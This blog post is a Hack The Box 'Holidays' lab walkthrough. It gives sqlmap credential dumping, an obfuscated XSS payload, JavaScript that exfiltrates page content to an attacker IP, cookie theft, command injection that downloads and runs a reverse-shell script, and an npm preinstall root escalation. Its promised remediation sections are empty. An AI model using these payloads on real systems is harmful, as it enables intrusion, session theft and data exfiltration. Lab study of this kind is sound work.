---
layout: post
title:  "Hack The Box - Holidays - Source Code Analysis"
date:   2021-10-17 13:00:10 +0200
tags: ["Hack The Box","OSWE"]
---

# Introduction
The hack the box machine "Holidays is a hard machine with requires knowledge in the areas of User-Agent filters, SQL injections, XSS filter evasion, command injection and NPM packages.

![HolidayCard](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/card.png)

In this post, we study the coding mistakes behind the vulnerabilites and how to remediate them.

The next two sections covers expliotation process and a code analysis to identify the vulnerabilites. Feel free to skip the next section if you already know how to exploit this Hack The Box machine.

# Overview of Exploitation
The first step

Capture login post request to http://10.10.10.25:8000/login in burp, change user-agent to “Linux” and press “copy to file” > linux.req              #Routing is different depending on user-agent
sqlmap -r linux.req --level=5 --risk=3 -T users --dump -threads 10
We get RickA:fdc8cd4cff2c19e0d1022e78481ddf36:nevergonnagiveyouup           (cracked with crackstation)
Log in to http://10.10.10.25:8000/login

genPayload.py
{% highlight python linenos %}
payload = """document.write('<script src="http://10.10.14.25/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
{% endhighlight %}

x.js
{% highlight Javascript linenos %}
req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://10.10.14.25/leak?x="+btoa(req1.responseText),false);
req2.send();
{% endhighlight %}

Sudo python3 -m 80
python3 genPayload.py | xclip -selection clipboard
Post a comment with the clipboard content
Wait 1 minutes. Then, copy the base64 content from the web server output and put in x.b64
cat x.b64 | base64 -d > x.html
Get the cookie value from x.html    (connect.sid&#x3D;s%3A0c2b6ab0-2905-11ec-93c0-9b5646fb6973.5woc5mpM%2F9dn5RN9MmvdvDeOtDts1f423a6mkfALt70)
Add the cookie in the browser and go to http://10.10.10.25:8000/admin

sudo rlwrap nc -lvnp 443
nano rs
GET /admin/export?table=x%26wget+168431129/rs
GET /admin/export?table=x%26bash+rs

The privilege escalation can be performed by abusing sudo rights on npm. As can be seen by using `sudo -l`, we can install arbitrary NPM packages with root privileges. This could be dangerous as it is possible install an NPM package which runs code before the installation process begins. By x, it is possible to run arbitrary code. This can be done by creating a custom node package module. For this, we can use the template (rimrafall github) which contains a folder named "rimrafall" with a package.JSON file. We modify the package.json file to look as below and leave the index.js file as it is.


Note that preinstall is executed when we run npm install. In fact these scripts are executed:
https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install

(package.json)

Package.json 
https://docs.npmjs.com/cli/v7/configuring-npm/package-json#name


(index.js)

Next, we start a listner on a free port, in this example we chose port 9999.

sudo npm i rimrafall to attempt to install the custom node module as a root user, triggering the execution of our reverse shell payload.



# Code analysis
## User-Agent filtering

## SQL Injection Vulnerability

## XSS Vulnerability

## Command injection vulnerability



